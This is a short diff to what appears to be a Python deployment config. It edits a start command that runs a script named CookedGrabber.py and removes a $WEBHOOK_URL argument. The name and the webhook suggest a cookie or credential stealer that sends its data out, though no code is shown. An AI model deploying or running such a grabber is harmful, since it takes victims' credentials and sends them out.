@@ -2,4 +2,4 @@
 providers = ['python']
 
 [start]
-cmd = 'python CookedGrabber.py $WEBHOOK_URL'
+cmd = 'python CookedGrabber.py'
